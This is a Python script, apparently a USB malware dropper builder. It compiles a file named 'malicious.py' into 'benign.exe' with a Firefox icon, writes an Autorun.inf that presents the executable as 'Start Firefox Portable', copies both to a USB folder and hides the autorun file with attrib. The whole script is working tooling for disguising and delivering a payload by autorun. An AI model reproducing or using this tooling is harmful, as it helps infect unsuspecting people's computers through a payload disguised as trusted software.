import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

# Create the USB directory if it doesn't exist
if not os.path.exists(usbdir):
    os.makedirs(usbdir)

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name=" + exename,
    "--icon=" + icon
])

print("EXE Created")

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")

# Get the full path to __pycache__ directory
pycache_dir = os.path.join(pwd, "__pycache__")

# Attempt to remove __pycache__ directory, handle FileNotFoundError
try:
    shutil.rmtree(pycache_dir)
except FileNotFoundError:
    pass

os.remove(exename + ".spec")

print("Creating Autorun File")

# Create Autorun File
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open=" + exename + "\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon=" + exename + "\n")

print("Setting Up USB")

# Delete existing files from USB (if exists) and move new files to USB
if os.path.isfile(os.path.join(usbdir, exename)):
    os.remove(os.path.join(usbdir, exename))

if os.path.isfile(os.path.join(usbdir, "Autorun.inf")):
    os.remove(os.path.join(usbdir, "Autorun.inf"))

shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system("attrib +h " + os.path.join(usbdir, "Autorun.inf"))

print("USB setup completed.")
